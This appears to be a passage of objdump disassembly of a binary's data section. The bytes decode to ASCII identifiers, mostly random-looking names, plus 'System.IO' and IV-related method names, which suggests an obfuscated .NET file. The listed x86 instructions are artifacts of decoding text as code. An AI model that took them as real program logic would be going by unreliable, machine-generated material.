  407b71:	47                   	inc    %edi
  407b72:	59                   	pop    %ecx
  407b73:	6c                   	insb   (%dx),%es:(%edi)
  407b74:	6a 70                	push   $0x70
  407b76:	76 49                	jbe    0x407bc1
  407b78:	51                   	push   %ecx
  407b79:	70 53                	jo     0x407bce
  407b7b:	47                   	inc    %edi
  407b7c:	5a                   	pop    %edx
  407b7d:	71 49                	jno    0x407bc8
  407b7f:	00 6c 64 53          	add    %ch,0x53(%esp,%eiz,2)
  407b83:	73 51                	jae    0x407bd6
  407b85:	50                   	push   %eax
  407b86:	65 69 44 6a 74 71 49 	imul   $0x4e004971,%gs:0x74(%edx,%ebp,2),%eax
  407b8d:	00 4e 
  407b8f:	70 78                	jo     0x407c09
  407b91:	76 5a                	jbe    0x407bed
  407b93:	56                   	push   %esi
  407b94:	50                   	push   %eax
  407b95:	4c                   	dec    %esp
  407b96:	79 49                	jns    0x407be1
  407b98:	00 57 69             	add    %dl,0x69(%edi)
  407b9b:	6b 61 66 53          	imul   $0x53,0x66(%ecx),%esp
  407b9f:	61                   	popa
  407ba0:	44                   	inc    %esp
  407ba1:	41                   	inc    %ecx
  407ba2:	4a                   	dec    %edx
  407ba3:	00 4a 51             	add    %cl,0x51(%edx)
  407ba6:	61                   	popa
  407ba7:	61                   	popa
  407ba8:	79 51                	jns    0x407bfb
  407baa:	56                   	push   %esi
  407bab:	66 62 44 61 58       	bound  %ax,0x58(%ecx,%eiz,2)
  407bb0:	5a                   	pop    %edx
  407bb1:	4a                   	dec    %edx
  407bb2:	00 62 76             	add    %ah,0x76(%edx)
  407bb5:	63 56 49             	arpl   %edx,0x49(%esi)
  407bb8:	59                   	pop    %ecx
  407bb9:	77 4e                	ja     0x407c09
  407bbb:	56                   	push   %esi
  407bbc:	53                   	push   %ebx
  407bbd:	63 4a 00             	arpl   %ecx,0x0(%edx)
  407bc0:	78 6e                	js     0x407c30
  407bc2:	71 45                	jno    0x407c09
  407bc4:	49                   	dec    %ecx
  407bc5:	69 6e 44 53 54 42 6a 	imul   $0x6a425453,0x44(%esi),%ebp
  407bcc:	4a                   	dec    %edx
  407bcd:	00 6b 61             	add    %ch,0x61(%ebx)
  407bd0:	6d                   	insl   (%dx),%es:(%edi)
  407bd1:	47                   	inc    %edi
  407bd2:	4d                   	dec    %ebp
  407bd3:	59                   	pop    %ecx
  407bd4:	67 61                	addr16 popa
  407bd6:	66 68 41 55          	pushw  $0x5541
  407bda:	72 4a                	jb     0x407c26
  407bdc:	00 75 55             	add    %dh,0x55(%ebp)
  407bdf:	4b                   	dec    %ebx
  407be0:	63 66 49             	arpl   %esp,0x49(%esi)
  407be3:	77 70                	ja     0x407c55
  407be5:	63 72 4a             	arpl   %esi,0x4a(%edx)
  407be8:	00 7a 75             	add    %bh,0x75(%edx)
  407beb:	67 72 58             	addr16 jb 0x407c46
  407bee:	71 41                	jno    0x407c31
  407bf0:	7a 61                	jp     0x407c53
  407bf2:	4b                   	dec    %ebx
  407bf3:	43                   	inc    %ebx
  407bf4:	79 4a                	jns    0x407c40
  407bf6:	00 73 79             	add    %dh,0x79(%ebx)
  407bf9:	4c                   	dec    %esp
  407bfa:	4a                   	dec    %edx
  407bfb:	4c                   	dec    %esp
  407bfc:	69 55 59 66 46 4d 4d 	imul   $0x4d4d4666,0x59(%ebp),%edx
  407c03:	41                   	inc    %ecx
  407c04:	4b                   	dec    %ebx
  407c05:	00 65 71             	add    %ah,0x71(%ebp)
  407c08:	44                   	inc    %esp
  407c09:	63 56 6a             	arpl   %edx,0x6a(%esi)
  407c0c:	71 4b                	jno    0x407c59
  407c0e:	72 4b                	jb     0x407c5b
  407c10:	6f                   	outsl  %ds:(%esi),(%dx)
  407c11:	52                   	push   %edx
  407c12:	44                   	inc    %esp
  407c13:	4b                   	dec    %ebx
  407c14:	00 61 78             	add    %ah,0x78(%ecx)
  407c17:	6f                   	outsl  %ds:(%esi),(%dx)
  407c18:	48                   	dec    %eax
  407c19:	77 55                	ja     0x407c70
  407c1b:	48                   	dec    %eax
  407c1c:	55                   	push   %ebp
  407c1d:	62 55 45             	bound  %edx,0x45(%ebp)
  407c20:	4b                   	dec    %ebx
  407c21:	00 50 45             	add    %dl,0x45(%eax)
  407c24:	42                   	inc    %edx
  407c25:	45                   	inc    %ebp
  407c26:	57                   	push   %edi
  407c27:	42                   	inc    %edx
  407c28:	4a                   	dec    %edx
  407c29:	4c                   	dec    %esp
  407c2a:	58                   	pop    %eax
  407c2b:	4f                   	dec    %edi
  407c2c:	4d                   	dec    %ebp
  407c2d:	4a                   	dec    %edx
  407c2e:	4b                   	dec    %ebx
  407c2f:	00 48 76             	add    %cl,0x76(%eax)
  407c32:	70 45                	jo     0x407c79
  407c34:	6c                   	insb   (%dx),%es:(%edi)
  407c35:	68 42 41 4e 4b       	push   $0x4b4e4142
  407c3a:	00 58 56             	add    %bl,0x56(%eax)
  407c3d:	46                   	inc    %esi
  407c3e:	65 51                	gs push %ecx
  407c40:	54                   	push   %esp
  407c41:	65 72 4b             	gs jb  0x407c8f
  407c44:	55                   	push   %ebp
  407c45:	47                   	inc    %edi
  407c46:	74 65                	je     0x407cad
  407c48:	72 55                	jb     0x407c9f
  407c4a:	4b                   	dec    %ebx
  407c4b:	00 42 70             	add    %al,0x70(%edx)
  407c4e:	4b                   	dec    %ebx
  407c4f:	62 6e 51             	bound  %ebp,0x51(%esi)
  407c52:	6a 57                	push   $0x57
  407c54:	50                   	push   %eax
  407c55:	5a                   	pop    %edx
  407c56:	47                   	inc    %edi
  407c57:	58                   	pop    %eax
  407c58:	4b                   	dec    %ebx
  407c59:	00 6e 4d             	add    %ch,0x4d(%esi)
  407c5c:	41                   	inc    %ecx
  407c5d:	6b 6b 66 4c          	imul   $0x4c,0x66(%ebx),%ebp
  407c61:	58                   	pop    %eax
  407c62:	73 58                	jae    0x407cbc
  407c64:	4b                   	dec    %ebx
  407c65:	00 75 53             	add    %dh,0x53(%ebp)
  407c68:	47                   	inc    %edi
  407c69:	6e                   	outsb  %ds:(%esi),(%dx)
  407c6a:	76 48                	jbe    0x407cb4
  407c6c:	46                   	inc    %esi
  407c6d:	4b                   	dec    %ebx
  407c6e:	55                   	push   %ebp
  407c6f:	6a 41                	push   $0x41
  407c71:	7a 7a                	jp     0x407ced
  407c73:	62 4b 00             	bound  %ecx,0x0(%ebx)
  407c76:	58                   	pop    %eax
  407c77:	46                   	inc    %esi
  407c78:	76 4d                	jbe    0x407cc7
  407c7a:	65 46                	gs inc %esi
  407c7c:	76 73                	jbe    0x407cf1
  407c7e:	6c                   	insb   (%dx),%es:(%edi)
  407c7f:	54                   	push   %esp
  407c80:	4e                   	dec    %esi
  407c81:	44                   	inc    %esp
  407c82:	6e                   	outsb  %ds:(%esi),(%dx)
  407c83:	4b                   	dec    %ebx
  407c84:	00 6b 56             	add    %ch,0x56(%ebx)
  407c87:	75 65                	jne    0x407cee
  407c89:	71 4a                	jno    0x407cd5
  407c8b:	4a                   	dec    %edx
  407c8c:	71 53                	jno    0x407ce1
  407c8e:	45                   	inc    %ebp
  407c8f:	6e                   	outsb  %ds:(%esi),(%dx)
  407c90:	4b                   	dec    %ebx
  407c91:	00 6c 49 51          	add    %ch,0x51(%ecx,%ecx,2)
  407c95:	65 59                	gs pop %ecx
  407c97:	63 61 64             	arpl   %esp,0x64(%ecx)
  407c9a:	74 4b                	je     0x407ce7
  407c9c:	00 51 4c             	add    %dl,0x4c(%ecx)
  407c9f:	57                   	push   %edi
  407ca0:	64 76 43             	fs jbe 0x407ce6
  407ca3:	4e                   	dec    %esi
  407ca4:	5a                   	pop    %edx
  407ca5:	4b                   	dec    %ebx
  407ca6:	74 44                	je     0x407cec
  407ca8:	76 4b                	jbe    0x407cf5
  407caa:	00 58 66             	add    %bl,0x66(%eax)
  407cad:	52                   	push   %edx
  407cae:	44                   	inc    %esp
  407caf:	78 65                	js     0x407d16
  407cb1:	5a                   	pop    %edx
  407cb2:	65 56                	gs push %esi
  407cb4:	66 77 78             	data16 ja 0x407d2f
  407cb7:	4b                   	dec    %ebx
  407cb8:	00 65 6e             	add    %ah,0x6e(%ebp)
  407cbb:	5a                   	pop    %edx
  407cbc:	5a                   	pop    %edx
  407cbd:	5a                   	pop    %edx
  407cbe:	50                   	push   %eax
  407cbf:	69 55 5a 67 41 4c 00 	imul   $0x4c4167,0x5a(%ebp),%edx
  407cc6:	44                   	inc    %esp
  407cc7:	69 6a 78 78 74 50 56 	imul   $0x56507478,0x78(%edx),%ebp
  407cce:	48                   	dec    %eax
  407ccf:	45                   	inc    %ebp
  407cd0:	54                   	push   %esp
  407cd1:	47                   	inc    %edi
  407cd2:	44                   	inc    %esp
  407cd3:	4c                   	dec    %esp
  407cd4:	00 57 42             	add    %dl,0x42(%edi)
  407cd7:	4d                   	dec    %ebp
  407cd8:	71 74                	jno    0x407d4e
  407cda:	76 75                	jbe    0x407d51
  407cdc:	53                   	push   %ebx
  407cdd:	58                   	pop    %eax
  407cde:	51                   	push   %ecx
  407cdf:	49                   	dec    %ecx
  407ce0:	4c                   	dec    %esp
  407ce1:	00 75 67             	add    %dh,0x67(%ebp)
  407ce4:	79 6e                	jns    0x407d54
  407ce6:	64 75 55             	fs jne 0x407d3e
  407ce9:	53                   	push   %ebx
  407cea:	71 6d                	jno    0x407d59
  407cec:	67 61                	addr16 popa
  407cee:	4c                   	dec    %esp
  407cef:	00 4b 49             	add    %cl,0x49(%ebx)
  407cf2:	71 57                	jno    0x407d4b
  407cf4:	66 46                	inc    %si
  407cf6:	6b 59 74 47          	imul   $0x47,0x74(%ecx),%ebx
  407cfa:	6f                   	outsl  %ds:(%esi),(%dx)
  407cfb:	62 4c 00 6d          	bound  %ecx,0x6d(%eax,%eax,1)
  407cff:	75 65                	jne    0x407d66
  407d01:	73 68                	jae    0x407d6b
  407d03:	4c                   	dec    %esp
  407d04:	4b                   	dec    %ebx
  407d05:	76 42                	jbe    0x407d49
  407d07:	73 78                	jae    0x407d81
  407d09:	57                   	push   %edi
  407d0a:	66 4c                	dec    %sp
  407d0c:	00 65 6f             	add    %ah,0x6f(%ebp)
  407d0f:	4b                   	dec    %ebx
  407d10:	78 4a                	js     0x407d5c
  407d12:	45                   	inc    %ebp
  407d13:	66 62 6c 54 52       	bound  %bp,0x52(%esp,%edx,2)
  407d18:	67 4c                	addr16 dec %esp
  407d1a:	00 66 6c             	add    %ah,0x6c(%esi)
  407d1d:	52                   	push   %edx
  407d1e:	49                   	dec    %ecx
  407d1f:	4e                   	dec    %esi
  407d20:	74 59                	je     0x407d7b
  407d22:	4a                   	dec    %edx
  407d23:	75 56                	jne    0x407d7b
  407d25:	78 55                	js     0x407d7c
  407d27:	6f                   	outsl  %ds:(%esi),(%dx)
  407d28:	4c                   	dec    %esp
  407d29:	00 44 73 64          	add    %al,0x64(%ebx,%esi,2)
  407d2d:	62 48 77             	bound  %ecx,0x77(%eax)
  407d30:	64 43                	fs inc %ebx
  407d32:	79 49                	jns    0x407d7d
  407d34:	53                   	push   %ebx
  407d35:	6a 7a                	push   $0x7a
  407d37:	4c                   	dec    %esp
  407d38:	00 4d 56             	add    %cl,0x56(%ebp)
  407d3b:	4e                   	dec    %esi
  407d3c:	50                   	push   %eax
  407d3d:	44                   	inc    %esp
  407d3e:	79 74                	jns    0x407db4
  407d40:	49                   	dec    %ecx
  407d41:	57                   	push   %edi
  407d42:	57                   	push   %edi
  407d43:	6e                   	outsb  %ds:(%esi),(%dx)
  407d44:	4f                   	dec    %edi
  407d45:	56                   	push   %esi
  407d46:	62 59 41             	bound  %ebx,0x41(%ecx)
  407d49:	4d                   	dec    %ebp
  407d4a:	00 69 70             	add    %ch,0x70(%ecx)
  407d4d:	6f                   	outsl  %ds:(%esi),(%dx)
  407d4e:	4d                   	dec    %ebp
  407d4f:	74 45                	je     0x407d96
  407d51:	57                   	push   %edi
  407d52:	41                   	inc    %ecx
  407d53:	6e                   	outsb  %ds:(%esi),(%dx)
  407d54:	71 51                	jno    0x407da7
  407d56:	4d                   	dec    %ebp
  407d57:	00 55 66             	add    %dl,0x66(%ebp)
  407d5a:	76 78                	jbe    0x407dd4
  407d5c:	49                   	dec    %ecx
  407d5d:	67 58                	addr16 pop %eax
  407d5f:	62 65 59             	bound  %esp,0x59(%ebp)
  407d62:	4d                   	dec    %ebp
  407d63:	00 4a 54             	add    %cl,0x54(%edx)
  407d66:	6e                   	outsb  %ds:(%esi),(%dx)
  407d67:	58                   	pop    %eax
  407d68:	70 4c                	jo     0x407db6
  407d6a:	67 62 63 4d          	bound  %esp,0x4d(%bp,%di)
  407d6e:	00 6f 59             	add    %ch,0x59(%edi)
  407d71:	6b 77 41 73          	imul   $0x73,0x41(%edi),%esi
  407d75:	52                   	push   %edx
  407d76:	53                   	push   %ebx
  407d77:	48                   	dec    %eax
  407d78:	56                   	push   %esi
  407d79:	70 77                	jo     0x407df2
  407d7b:	4d                   	dec    %ebp
  407d7c:	00 43 55             	add    %al,0x55(%ebx)
  407d7f:	49                   	dec    %ecx
  407d80:	63 47 65             	arpl   %eax,0x65(%edi)
  407d83:	78 42                	js     0x407dc7
  407d85:	4c                   	dec    %esp
  407d86:	4b                   	dec    %ebx
  407d87:	43                   	inc    %ebx
  407d88:	4e                   	dec    %esi
  407d89:	00 67 77             	add    %ah,0x77(%edi)
  407d8c:	6f                   	outsl  %ds:(%esi),(%dx)
  407d8d:	43                   	inc    %ebx
  407d8e:	63 59 66             	arpl   %ebx,0x66(%ecx)
  407d91:	42                   	inc    %edx
  407d92:	4f                   	dec    %edi
  407d93:	49                   	dec    %ecx
  407d94:	4e                   	dec    %esi
  407d95:	00 54 76 53          	add    %dl,0x53(%esi,%esi,2)
  407d99:	64 44                	fs inc %esp
  407d9b:	50                   	push   %eax
  407d9c:	4a                   	dec    %edx
  407d9d:	7a 73                	jp     0x407e12
  407d9f:	73 6c                	jae    0x407e0d
  407da1:	52                   	push   %edx
  407da2:	4e                   	dec    %esi
  407da3:	00 75 50             	add    %dh,0x50(%ebp)
  407da6:	50                   	push   %eax
  407da7:	77 4c                	ja     0x407df5
  407da9:	4b                   	dec    %ebx
  407daa:	63 78 64             	arpl   %edi,0x64(%eax)
  407dad:	51                   	push   %ecx
  407dae:	78 65                	js     0x407e15
  407db0:	6b 4e 00 4e          	imul   $0x4e,0x0(%esi),%ecx
  407db4:	67 69 4c 4f 74 52 63 	imul   $0x41635274,0x4f(%si),%ecx
  407dbb:	41 
  407dbc:	69 7a 53 77 76 43 4f 	imul   $0x4f437677,0x53(%edx),%edi
  407dc3:	00 53 79             	add    %dl,0x79(%ebx)
  407dc6:	73 74                	jae    0x407e3c
  407dc8:	65 6d                	gs insl (%dx),%es:(%edi)
  407dca:	2e 49                	cs dec %ecx
  407dcc:	4f                   	dec    %edi
  407dcd:	00 4e 48             	add    %cl,0x48(%esi)
  407dd0:	6b 47 46 51          	imul   $0x51,0x46(%edi),%eax
  407dd4:	4c                   	dec    %esp
  407dd5:	75 58                	jne    0x407e2f
  407dd7:	44                   	inc    %esp
  407dd8:	43                   	inc    %ebx
  407dd9:	69 4d 4f 00 7a 56 68 	imul   $0x68567a00,0x4f(%ebp),%ecx
  407de0:	72 51                	jb     0x407e33
  407de2:	50                   	push   %eax
  407de3:	49                   	dec    %ecx
  407de4:	5a                   	pop    %edx
  407de5:	55                   	push   %ebp
  407de6:	4f                   	dec    %edi
  407de7:	00 49 7a             	add    %cl,0x7a(%ecx)
  407dea:	47                   	inc    %edi
  407deb:	48                   	dec    %eax
  407dec:	4a                   	dec    %edx
  407ded:	52                   	push   %edx
  407dee:	5a                   	pop    %edx
  407def:	4d                   	dec    %ebp
  407df0:	63 4e 6a             	arpl   %ecx,0x6a(%esi)
  407df3:	4f                   	dec    %edi
  407df4:	00 46 50             	add    %al,0x50(%esi)
  407df7:	6c                   	insb   (%dx),%es:(%edi)
  407df8:	63 74 6f 48          	arpl   %esi,0x48(%edi,%ebp,2)
  407dfc:	51                   	push   %ecx
  407dfd:	78 4f                	js     0x407e4e
  407dff:	00 6b 53             	add    %ch,0x53(%ebx)
  407e02:	52                   	push   %edx
  407e03:	48                   	dec    %eax
  407e04:	41                   	inc    %ecx
  407e05:	53                   	push   %ebx
  407e06:	4f                   	dec    %edi
  407e07:	45                   	inc    %ebp
  407e08:	63 50 4b             	arpl   %edx,0x4b(%eax)
  407e0b:	47                   	inc    %edi
  407e0c:	50                   	push   %eax
  407e0d:	00 49 6a             	add    %cl,0x6a(%ecx)
  407e10:	69 61 66 69 67 64 46 	imul   $0x46646769,0x66(%ecx),%esp
  407e17:	46                   	inc    %esi
  407e18:	4e                   	dec    %esi
  407e19:	50                   	push   %eax
  407e1a:	00 58 58             	add    %bl,0x58(%eax)
  407e1d:	4a                   	dec    %edx
  407e1e:	6e                   	outsb  %ds:(%esi),(%dx)
  407e1f:	41                   	inc    %ecx
  407e20:	7a 4c                	jp     0x407e6e
  407e22:	4a                   	dec    %edx
  407e23:	56                   	push   %esi
  407e24:	63 50 00             	arpl   %edx,0x0(%eax)
  407e27:	49                   	dec    %ecx
  407e28:	48                   	dec    %eax
  407e29:	51                   	push   %ecx
  407e2a:	6a 71                	push   $0x71
  407e2c:	7a 66                	jp     0x407e94
  407e2e:	76 6c                	jbe    0x407e9c
  407e30:	50                   	push   %eax
  407e31:	69 75 65 50 00 54 73 	imul   $0x73540050,0x65(%ebp),%esi
  407e38:	52                   	push   %edx
  407e39:	4b                   	dec    %ebx
  407e3a:	62 74 66 42          	bound  %esi,0x42(%esi,%eiz,2)
  407e3e:	6a 50                	push   $0x50
  407e40:	00 78 54             	add    %bh,0x54(%eax)
  407e43:	6f                   	outsl  %ds:(%esi),(%dx)
  407e44:	63 5a 4d             	arpl   %ebx,0x4d(%edx)
  407e47:	6e                   	outsb  %ds:(%esi),(%dx)
  407e48:	6f                   	outsl  %ds:(%esi),(%dx)
  407e49:	54                   	push   %esp
  407e4a:	6c                   	insb   (%dx),%es:(%edi)
  407e4b:	49                   	dec    %ecx
  407e4c:	44                   	inc    %esp
  407e4d:	73 50                	jae    0x407e9f
  407e4f:	00 5a 71             	add    %bl,0x71(%edx)
  407e52:	68 58 78 4d 46       	push   $0x464d7858
  407e57:	53                   	push   %ebx
  407e58:	44                   	inc    %esp
  407e59:	51                   	push   %ecx
  407e5a:	00 4b 4a             	add    %cl,0x4a(%ebx)
  407e5d:	74 6d                	je     0x407ecc
  407e5f:	4e                   	dec    %esi
  407e60:	61                   	popa
  407e61:	63 53 49             	arpl   %edx,0x49(%ebx)
  407e64:	65 72 4b             	gs jb  0x407eb2
  407e67:	52                   	push   %edx
  407e68:	6b 71 65 51          	imul   $0x51,0x65(%ecx),%esi
  407e6c:	00 70 6e             	add    %dh,0x6e(%eax)
  407e6f:	50                   	push   %eax
  407e70:	76 6d                	jbe    0x407edf
  407e72:	64 64 52             	fs fs push %edx
  407e75:	72 44                	jb     0x407ebb
  407e77:	77 42                	ja     0x407ebb
  407e79:	41                   	inc    %ecx
  407e7a:	67 51                	addr16 push %ecx
  407e7c:	00 59 71             	add    %bl,0x71(%ecx)
  407e7f:	51                   	push   %ecx
  407e80:	69 45 7a 46 59 54 74 	imul   $0x74545946,0x7a(%ebp),%eax
  407e87:	51                   	push   %ecx
  407e88:	00 70 66             	add    %dh,0x66(%eax)
  407e8b:	6e                   	outsb  %ds:(%esi),(%dx)
  407e8c:	43                   	inc    %ebx
  407e8d:	71 54                	jno    0x407ee3
  407e8f:	43                   	inc    %ebx
  407e90:	59                   	pop    %ecx
  407e91:	71 73                	jno    0x407f06
  407e93:	47                   	inc    %edi
  407e94:	77 41                	ja     0x407ed7
  407e96:	46                   	inc    %esi
  407e97:	52                   	push   %edx
  407e98:	00 42 68             	add    %al,0x68(%edx)
  407e9b:	4b                   	dec    %ebx
  407e9c:	6e                   	outsb  %ds:(%esi),(%dx)
  407e9d:	61                   	popa
  407e9e:	6a 70                	push   $0x70
  407ea0:	54                   	push   %esp
  407ea1:	4c                   	dec    %esp
  407ea2:	71 48                	jno    0x407eec
  407ea4:	52                   	push   %edx
  407ea5:	00 53 76             	add    %dl,0x76(%ebx)
  407ea8:	47                   	inc    %edi
  407ea9:	6a 6f                	push   $0x6f
  407eab:	58                   	pop    %eax
  407eac:	6a 65                	push   $0x65
  407eae:	74 53                	je     0x407f03
  407eb0:	5a                   	pop    %edx
  407eb1:	46                   	inc    %esi
  407eb2:	70 52                	jo     0x407f06
  407eb4:	4d                   	dec    %ebp
  407eb5:	52                   	push   %edx
  407eb6:	00 6e 71             	add    %ch,0x71(%esi)
  407eb9:	75 68                	jne    0x407f23
  407ebb:	71 59                	jno    0x407f16
  407ebd:	78 57                	js     0x407f16
  407ebf:	61                   	popa
  407ec0:	43                   	inc    %ebx
  407ec1:	4d                   	dec    %ebp
  407ec2:	43                   	inc    %ebx
  407ec3:	62 52 00             	bound  %edx,0x0(%edx)
  407ec6:	4b                   	dec    %ebx
  407ec7:	4d                   	dec    %ebp
  407ec8:	42                   	inc    %edx
  407ec9:	6e                   	outsb  %ds:(%esi),(%dx)
  407eca:	42                   	inc    %edx
  407ecb:	68 47 72 70 42       	push   $0x42707247
  407ed0:	45                   	inc    %ebp
  407ed1:	79 6a                	jns    0x407f3d
  407ed3:	67 52                	addr16 push %edx
  407ed5:	00 74 42 4c          	add    %dh,0x4c(%edx,%eax,2)
  407ed9:	4e                   	dec    %esi
  407eda:	61                   	popa
  407edb:	65 44                	gs inc %esp
  407edd:	72 68                	jb     0x407f47
  407edf:	49                   	dec    %ecx
  407ee0:	70 77                	jo     0x407f59
  407ee2:	52                   	push   %edx
  407ee3:	00 66 45             	add    %ah,0x45(%esi)
  407ee6:	71 50                	jno    0x407f38
  407ee8:	75 70                	jne    0x407f5a
  407eea:	53                   	push   %ebx
  407eeb:	49                   	dec    %ecx
  407eec:	50                   	push   %eax
  407eed:	6f                   	outsl  %ds:(%esi),(%dx)
  407eee:	77 46                	ja     0x407f36
  407ef0:	42                   	inc    %edx
  407ef1:	53                   	push   %ebx
  407ef2:	00 71 7a             	add    %dh,0x7a(%ecx)
  407ef5:	76 5a                	jbe    0x407f51
  407ef7:	79 6e                	jns    0x407f67
  407ef9:	6a 70                	push   $0x70
  407efb:	51                   	push   %ecx
  407efc:	66 66 4a             	data16 dec %dx
  407eff:	53                   	push   %ebx
  407f00:	00 45 42             	add    %al,0x42(%ebp)
  407f03:	4a                   	dec    %edx
  407f04:	4a                   	dec    %edx
  407f05:	46                   	inc    %esi
  407f06:	4e                   	dec    %esi
  407f07:	4c                   	dec    %esp
  407f08:	65 41                	gs inc %ecx
  407f0a:	49                   	dec    %ecx
  407f0b:	4d                   	dec    %ebp
  407f0c:	53                   	push   %ebx
  407f0d:	00 68 53             	add    %ch,0x53(%eax)
  407f10:	4f                   	dec    %edi
  407f11:	71 48                	jno    0x407f5b
  407f13:	56                   	push   %esi
  407f14:	77 78                	ja     0x407f8e
  407f16:	45                   	inc    %ebp
  407f17:	52                   	push   %edx
  407f18:	6b 67 54 75          	imul   $0x75,0x54(%edi),%esp
  407f1c:	53                   	push   %ebx
  407f1d:	00 54 6f 44          	add    %dl,0x44(%edi,%ebp,2)
  407f21:	78 6d                	js     0x407f90
  407f23:	6d                   	insl   (%dx),%es:(%edi)
  407f24:	73 4d                	jae    0x407f73
  407f26:	47                   	inc    %edi
  407f27:	67 76 53             	addr16 jbe 0x407f7d
  407f2a:	00 65 69             	add    %ah,0x69(%ebp)
  407f2d:	4d                   	dec    %ebp
  407f2e:	4e                   	dec    %esi
  407f2f:	48                   	dec    %eax
  407f30:	6b 79 72 73          	imul   $0x73,0x72(%ecx),%edi
  407f34:	53                   	push   %ebx
  407f35:	54                   	push   %esp
  407f36:	00 68 4f             	add    %ch,0x4f(%eax)
  407f39:	45                   	inc    %ebp
  407f3a:	4f                   	dec    %edi
  407f3b:	49                   	dec    %ecx
  407f3c:	62 6f 6d             	bound  %ebp,0x6d(%edi)
  407f3f:	70 72                	jo     0x407fb3
  407f41:	54                   	push   %esp
  407f42:	00 47 6c             	add    %al,0x6c(%edi)
  407f45:	6f                   	outsl  %ds:(%esi),(%dx)
  407f46:	4d                   	dec    %ebp
  407f47:	68 4f 57 55 67       	push   $0x6755574f
  407f4c:	4a                   	dec    %edx
  407f4d:	6f                   	outsl  %ds:(%esi),(%dx)
  407f4e:	73 54                	jae    0x407fa4
  407f50:	00 6f 67             	add    %ch,0x67(%edi)
  407f53:	65 74 6e             	gs je  0x407fc4
  407f56:	68 6c 4c 77 56       	push   $0x56774c6c
  407f5b:	69 4d 55 00 6f 74 52 	imul   $0x52746f00,0x55(%ebp),%ecx
  407f62:	6e                   	outsb  %ds:(%esi),(%dx)
  407f63:	47                   	inc    %edi
  407f64:	6f                   	outsl  %ds:(%esi),(%dx)
  407f65:	76 71                	jbe    0x407fd8
  407f67:	48                   	dec    %eax
  407f68:	48                   	dec    %eax
  407f69:	50                   	push   %eax
  407f6a:	55                   	push   %ebp
  407f6b:	00 66 46             	add    %ah,0x46(%esi)
  407f6e:	54                   	push   %esp
  407f6f:	73 47                	jae    0x407fb8
  407f71:	6d                   	insl   (%dx),%es:(%edi)
  407f72:	54                   	push   %esp
  407f73:	49                   	dec    %ecx
  407f74:	55                   	push   %ebp
  407f75:	45                   	inc    %ebp
  407f76:	69 56 52 46 52 55 00 	imul   $0x555246,0x52(%esi),%edx
  407f7d:	6b 6f 54 75          	imul   $0x75,0x54(%edi),%ebp
  407f81:	5a                   	pop    %edx
  407f82:	42                   	inc    %edx
  407f83:	4e                   	dec    %esi
  407f84:	64 76 48             	fs jbe 0x407fcf
  407f87:	6b 6a 69 7a          	imul   $0x7a,0x69(%edx),%ebp
  407f8b:	46                   	inc    %esi
  407f8c:	63 52 55             	arpl   %edx,0x55(%edx)
  407f8f:	00 75 58             	add    %dh,0x58(%ebp)
  407f92:	47                   	inc    %edi
  407f93:	50                   	push   %eax
  407f94:	70 6f                	jo     0x408005
  407f96:	77 5a                	ja     0x407ff2
  407f98:	74 55                	je     0x407fef
  407f9a:	54                   	push   %esp
  407f9b:	55                   	push   %ebp
  407f9c:	00 77 75             	add    %dh,0x75(%edi)
  407f9f:	66 41                	inc    %cx
  407fa1:	72 6a                	jb     0x40800d
  407fa3:	45                   	inc    %ebp
  407fa4:	47                   	inc    %edi
  407fa5:	69 5a 72 43 4a 67 55 	imul   $0x55674a43,0x72(%edx),%ebx
  407fac:	00 56 54             	add    %dl,0x54(%esi)
  407faf:	5a                   	pop    %edx
  407fb0:	53                   	push   %ebx
  407fb1:	69 4b 73 61 44 55 45 	imul   $0x45554461,0x73(%ebx),%ecx
  407fb8:	56                   	push   %esi
  407fb9:	00 67 65             	add    %ah,0x65(%edi)
  407fbc:	74 5f                	je     0x40801d
  407fbe:	49                   	dec    %ecx
  407fbf:	56                   	push   %esi
  407fc0:	00 73 65             	add    %dh,0x65(%ebx)
  407fc3:	74 5f                	je     0x408024
  407fc5:	49                   	dec    %ecx
  407fc6:	56                   	push   %esi
  407fc7:	00 63 6d             	add    %ah,0x6d(%ebx)
  407fca:	55                   	push   %ebp
  407fcb:	4e                   	dec    %esi
  407fcc:	71 44                	jno    0x408012
  407fce:	67 6e                	outsb  %ds:(%si),(%dx)
  407fd0:	65 55                	gs push %ebp
  407fd2:	44                   	inc    %esp
  407fd3:	6a 63                	push   $0x63
  407fd5:	49                   	dec    %ecx
  407fd6:	56                   	push   %esi
  407fd7:	00 47 65             	add    %al,0x65(%edi)
  407fda:	6e                   	outsb  %ds:(%esi),(%dx)
  407fdb:	65 72 61             	gs jb  0x40803f
  407fde:	74 65                	je     0x408045
  407fe0:	49                   	dec    %ecx
  407fe1:	56                   	push   %esi
  407fe2:	00 44 47 6e          	add    %al,0x6e(%edi,%eax,2)
  407fe6:	4b                   	dec    %ebx
  407fe7:	66 61                	popaw
  407fe9:	72 69                	jb     0x408054
  407feb:	59                   	pop    %ecx
  407fec:	4e                   	dec    %esi
  407fed:	53                   	push   %ebx
  407fee:	56                   	push   %esi
  407fef:	00 4a 76             	add    %cl,0x76(%edx)
  407ff2:	54                   	push   %esp
  407ff3:	4d                   	dec    %ebp
  407ff4:	46                   	inc    %esi
  407ff5:	69 69 64 61 56 00 6b 	imul   $0x6b005661,0x64(%ecx),%ebp
  407ffc:	4e                   	dec    %esi
  407ffd:	43                   	inc    %ebx
  407ffe:	4b                   	dec    %ebx
  407fff:	58                   	pop    %eax
  408000:	50                   	push   %eax
  408001:	51                   	push   %ecx
  408002:	48                   	dec    %eax
  408003:	6a 55                	push   $0x55
  408005:	6a 6b                	push   $0x6b
  408007:	56                   	push   %esi
  408008:	00 70 77             	add    %dh,0x77(%eax)
  40800b:	42                   	inc    %edx
  40800c:	77 4c                	ja     0x40805a
  40800e:	46                   	inc    %esi
  40800f:	74 6a                	je     0x40807b
  408011:	61                   	popa
  408012:	4f                   	dec    %edi
  408013:	4b                   	dec    %ebx
  408014:	70 56                	jo     0x40806c
  408016:	00 70 7a             	add    %dh,0x7a(%eax)
  408019:	78 58                	js     0x408073
  40801b:	4b                   	dec    %ebx
  40801c:	54                   	push   %esp
  40801d:	5a                   	pop    %edx
  40801e:	4b                   	dec    %ebx
  40801f:	68 6a 77 70 56       	push   $0x5670776a
  408024:	00 64 73 48          	add    %ah,0x48(%ebx,%esi,2)
  408028:	66 6a 6e             	pushw  $0x6e
  40802b:	49                   	dec    %ecx
  40802c:	6b 58 4e 71          	imul   $0x71,0x4e(%eax),%ebx
  408030:	7a 56                	jp     0x408088
  408032:	00 66 54             	add    %ah,0x54(%esi)
  408035:	71 4a                	jno    0x408081
  408037:	48                   	dec    %eax
  408038:	68 49 4d 78 64       	push   $0x64784d49
